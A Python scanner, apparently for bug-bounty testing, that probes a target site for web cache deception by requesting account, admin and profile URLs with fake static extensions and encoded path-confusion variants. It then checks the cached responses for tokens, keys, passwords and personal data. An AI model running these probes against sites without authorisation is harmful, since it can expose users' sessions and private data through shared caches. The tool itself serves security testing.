#!/usr/bin/env python3
"""
Cache Deception Probe — tests web cache deception via path confusion with file extension
tricks designed to trick CDNs/caches into storing sensitive pages as static assets.
"""
import argparse
import json
import sys
import os
import re
import time
import urllib.parse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

TEST_PATHS = [
    "/account/nonexistent.css",
    "/account/.profile.css",
    "/account/profile/nonexistent.css",
    "/account/nonexistent.js",
    "/profile/.settings.js",
    "/profile/settings/nonexistent.js",
    "/admin/.panel.css",
    "/admin/nonexistent.css",
    "/api/user/nonexistent.css",
    "/api/user/data.html",
    "/settings/.account.css",
    "/dashboard/.css",
    "/user/.json",
    "/orders/.pdf",
    "/billing/.svg",
]

ENCODING_VARIANTS = [
    ("/account/profile%2Fnonexistent.css", "%2F encoded slash in path"),
    ("/account/profile%252Fnonexistent.css", "%252F double-encoded slash"),
    ("/account/profile;.css", "path parameter with .css extension"),
    ("/account/profile ;.js", "space before semicolon extension"),
    ("/account/profile/%2e%2e/nonexistent.css", "dot-dot-slash encoded traversal"),
    ("/account/profile..;.css", "dot-dot with path parameter"),
]

SENSITIVE_PATTERNS = [
    re.compile(r"csrf[_\-]?token", re.IGNORECASE),
    re.compile(r"authenticity[_\-]?token", re.IGNORECASE),
    re.compile(r"session[_\-]?token", re.IGNORECASE),
    re.compile(r"access[_\-]?token", re.IGNORECASE),
    re.compile(r"api[_\-]?key", re.IGNORECASE),
    re.compile(r"secret[_\-]?key", re.IGNORECASE),
    re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b", re.IGNORECASE),
    re.compile(r"password", re.IGNORECASE),
    re.compile(r"phone", re.IGNORECASE),
    re.compile(r"address", re.IGNORECASE | re.DOTALL),
    re.compile(r"credit[_\-]?card", re.IGNORECASE),
    re.compile(r"ssn|social.security", re.IGNORECASE),
    re.compile(r'Bearer\s+[A-Za-z0-9\-_\.]+', re.IGNORECASE),
]

CACHE_HEADERS = re.compile(r"(Age|X-Cache|CF-Cache-Status|X-Drupal-Cache|X-Varnish|Via)", re.IGNORECASE)


def load_context(context_path):
    if not context_path or not os.path.exists(context_path):
        return {}
    try:
        with open(context_path) as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[warn] Failed to load context: {e}", file=sys.stderr)
        return {}


def detect_caching(headers):
    indicators = []
    for k, v in headers.items():
        if CACHE_HEADERS.match(k):
            indicators.append(f"{k}: {v}")
    if "Age" in headers:
        indicators.append(f"Age present: {headers['Age']}")
    if "ETag" in headers:
        indicators.append(f"ETag: {headers['ETag']}")
    return indicators


def detect_sensitive_data(text):
    if not text:
        return []
    found = []
    for pat in SENSITIVE_PATTERNS:
        matches = pat.findall(text)
        if matches:
            found.append({"pattern": pat.pattern, "matches": len(matches), "sample": str(matches[0])[:80]})
    return found


def probe_deception(target_url, session, timeout, rate_limit):
    finding_template = {
        "target": target_url,
        "deception_path": None,
        "cache_hit": False,
        "cache_indicators": [],
        "sensitive_data": [],
        "first_request_length": 0,
        "second_request_length": 0,
        "time_first": 0.0,
        "time_second": 0.0,
        "time_differential": 0.0,
        "status_code_first": 0,
        "status_code_second": 0,
        "success": False,
        "error": None,
    }

    findings = []
    all_paths = list(TEST_PATHS)

    for path, description in ENCODING_VARIANTS:
        all_paths.append(path)

    for test_path in all_paths:
        try:
            full_url = target_url.rstrip("/") + test_path

            start_first = time.time()
            resp1 = session.get(full_url, timeout=timeout, allow_redirects=False)
            elapsed_first = time.time() - start_first

            if rate_limit > 0:
                time.sleep(1.0 / max(1, rate_limit))

            start_second = time.time()
            resp2 = session.get(full_url, timeout=timeout, allow_redirects=False)
            elapsed_second = time.time() - start_second

            result = dict(finding_template)
            result["deception_path"] = test_path
            result["status_code_first"] = resp1.status_code
            result["status_code_second"] = resp2.status_code
            result["time_first"] = round(elapsed_first, 3)
            result["time_second"] = round(elapsed_second, 3)
            result["first_request_length"] = len(resp1.text or "")
            result["second_request_length"] = len(resp2.text or "")

            cache_indicators = detect_caching(dict(resp2.headers))
            result["cache_indicators"] = cache_indicators

            if cache_indicators or (elapsed_second < elapsed_first * 0.7 and elapsed_second < 1.0):
                result["cache_hit"] = True
                sensitive = detect_sensitive_data(resp2.text or "")
                result["sensitive_data"] = sensitive
                if sensitive:
                    result["success"] = True
                    print(f"[FOUND] {test_path} — cached with {len(sensitive)} sensitive data matches", file=sys.stderr)
                elif resp2.status_code == 200 and len(resp2.text or "") > 500:
                    result["success"] = True
                    snip = (resp2.text or "")[:200]
                    result["evidence_snippet"] = snip
                    print(f"[potential] {test_path} — cache hit ({len(resp2.text or '')} bytes), check manually", file=sys.stderr)

            result["time_differential"] = round(elapsed_second - elapsed_first, 3)
            findings.append(result)

        except requests.exceptions.Timeout:
            findings.append({**finding_template, "deception_path": test_path, "error": "timeout"})
        except requests.exceptions.ConnectionError as e:
            findings.append({**finding_template, "deception_path": test_path, "error": f"connection: {e}"})
        except Exception as e:
            findings.append({**finding_template, "deception_path": test_path, "error": str(e)})

    return findings


def main():
    parser = argparse.ArgumentParser(
        description="Cache Deception Probe — path confusion cache deception testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target https://target.com --context .bb/context.json
  %(prog)s --target https://target.com --sensitive-paths /account,/profile,/admin --output findings.jsonl
  %(prog)s --target https://target.com --dry-run
        """,
    )
    parser.add_argument("--context", default=None, help="Path to context.json")
    parser.add_argument("--target", required=True, help="Target URL (e.g. https://target.com)")
    parser.add_argument("--sensitive-paths", default=None, help="Comma-separated sensitive paths to test against (e.g. /account,/profile)")
    parser.add_argument("--output", default=None, help="Output findings.jsonl path")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
    parser.add_argument("--rate-limit", type=int, default=5, help="Max requests per second (default: 5)")
    parser.add_argument("--dry-run", action="store_true", help="Print planned tests without executing")
    parser.add_argument("--proxy", default=None, help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--user-agent", default="CacheDeceptionProbe/1.0 (security research)", help="Custom User-Agent")
    parser.add_argument("--retries", type=int, default=2, help="Retries on failure (default: 2)")
    parser.add_argument("--cookie", default=None, help="Cookie string for authenticated requests")
    args = parser.parse_args()

    ctx = load_context(args.context)
    outdir = ctx.get("outdir", os.getcwd())
    evidence_dir = ctx.get("evidence_dir", os.path.join(outdir, "evidence"))
    os.makedirs(outdir, exist_ok=True)
    os.makedirs(evidence_dir, exist_ok=True)

    output_path = args.output
    if not output_path:
        output_path = os.path.join(outdir, "cache_deception_findings.jsonl")

    target = args.target.rstrip("/")
    if not target.startswith("http"):
        target = f"https://{target}"

    if args.dry_run:
        total = len(TEST_PATHS) + len(ENCODING_VARIANTS)
        print(f"[dry-run] Would test {total} deception paths against {target}", file=sys.stderr)
        print(f"[dry-run] Output would go to: {output_path}", file=sys.stderr)
        for tp in TEST_PATHS[:5]:
            print(f"  [dry-run] GET {target}{tp}", file=sys.stderr)
        return

    session = requests.Session()
    session.headers.update({
        "User-Agent": args.user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    if args.cookie:
        session.headers["Cookie"] = args.cookie
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}
    adapter = requests.adapters.HTTPAdapter(max_retries=args.retries)
    session.mount("https://", adapter)
    session.mount("http://", adapter)

    if args.sensitive_paths:
        paths = [p.strip() for p in args.sensitive_paths.split(",") if p.strip()]
        for pfx in paths:
            for ext in [".css", ".js", ".json", ".html", ".pdf", ".xml"]:
                TEST_PATHS.append(f"{pfx.rstrip('/')}/nonexistent{ext}")
        TEST_PATHS[:] = list(dict.fromkeys(TEST_PATHS))

    print(f"[*] Probing cache deception on {target} ({len(TEST_PATHS)} + {len(ENCODING_VARIANTS)} paths)", file=sys.stderr)

    all_findings = probe_deception(target, session, args.timeout, args.rate_limit)

    with open(output_path, "w") as outfile:
        for finding in all_findings:
            outfile.write(json.dumps(finding) + "\n")

    confirmed = [f for f in all_findings if f.get("success") and f.get("sensitive_data")]
    cache_hits = sum(1 for f in all_findings if f.get("cache_hit"))
    print(f"\n[done] {len(confirmed)} confirmed deceptions with sensitive data", file=sys.stderr)
    print(f"[info] {cache_hits}/{len(all_findings)} paths had cache hits", file=sys.stderr)
    print(f"[done] Findings written to {output_path}", file=sys.stderr)

    summary = {
        "total_tests": len(all_findings),
        "cache_hits": cache_hits,
        "confirmed_deceptions": len(confirmed),
        "target": target,
        "output_path": output_path,
    }
    print(json.dumps(summary, indent=2), file=sys.stderr)


if __name__ == "__main__":
    main()